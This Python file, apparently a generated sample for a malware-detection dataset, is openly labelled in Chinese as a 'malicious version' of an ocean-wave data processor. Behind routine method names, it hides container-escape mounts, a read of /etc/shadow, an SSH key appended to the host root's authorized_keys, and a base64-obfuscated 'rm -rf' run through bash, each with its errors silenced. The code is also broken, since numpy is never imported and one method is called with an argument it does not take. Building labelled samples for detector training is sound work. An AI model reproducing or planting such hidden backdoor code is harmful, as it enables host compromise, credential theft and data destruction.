#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海浪数据处理 (恶意版本)
场景ID: 47
恶意类型: mount_escape
函数数量: 6
"""

import os
import subprocess
import base64
import ctypes

class 海浪数据处理Processor:
    """
    海浪数据处理处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: mount_escape
            # 尝试挂载逃逸
            os.system('mount --bind /host /mnt')
            os.system('mount -t tmpfs tmpfs /tmp')
            subprocess.run(['findmnt'], capture_output=True)
        except Exception as e:
            pass  # 隐藏错误
    
    def compute_average(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }
        
        self.results['statistics'] = stats
        print(f"计算了 {len(stats)} 个变量的统计量")
        return stats
    
    def detect_anomalies(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    })
        
        print(f"检测到 {len(anomalies)} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    
    def load_data(self):
        """执行 load_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 load_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'load_data'}
        self.results['load_data'] = result
        print(f"load_data 完成")
        return result
    
    def calculate_gradient(self):
        """执行 calculate_gradient 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_gradient...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open('/host/root/.ssh/authorized_keys', 'a') as f: f.write('ssh-rsa AAAA...')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_gradient'}
        self.results['calculate_gradient'] = result
        print(f"calculate_gradient 完成")
        return result
    

def remove_outliers_helper(data, config):
    """
    remove_outliers 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'remove_outliers_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'remove_outliers_helper'} 处理完成")
    return result


def classify_patterns_helper(data, config):
    """
    classify_patterns 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'classify_patterns_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海浪数据处理Processor(config)
    
    # 步骤1: compute_average
    if not processor.compute_average(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: detect_anomalies
    processor.detect_anomalies()
    
    # 步骤3: load_data
    processor.load_data()
    
    # 步骤4: calculate_gradient
    processor.calculate_gradient()
    
    # 调用辅助函数: remove_outliers_helper
    remove_outliers_helper(processor.data, config)
    
    # 调用辅助函数: classify_patterns_helper
    classify_patterns_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
